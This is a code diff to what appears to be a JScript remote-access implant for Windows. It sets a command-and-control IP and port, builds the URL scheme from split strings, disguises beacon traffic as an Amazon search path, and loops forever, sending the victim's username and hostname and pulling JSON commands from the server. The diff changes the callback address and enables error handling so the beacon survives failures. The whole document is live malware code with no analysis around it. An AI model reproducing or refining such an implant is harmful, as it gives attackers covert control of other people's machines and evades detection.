@@ -1,5 +1,5 @@
 //Define variables
-var ipp  = "172.16.71.1"
+var ipp  = "172.16.113.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -136,8 +136,8 @@ function b64d(data, type) {
 var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin
 while(true)
 {
-  //try
-  //{
+  try
+  {
     var retval = ""
     var serverMsg = post(home, checkin);
     var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0] // pull out json from http msg
@@ -269,10 +269,10 @@ while(true)
         }
       }
     }
-  //}
-  //catch (e) {
-  //  WScript.Sleep(sleepytime);
-  //}
+  }
+  catch (e) {
+    WScript.Sleep(sleepytime);
+  }
   WScript.Sleep(sleepytime);
 }
 
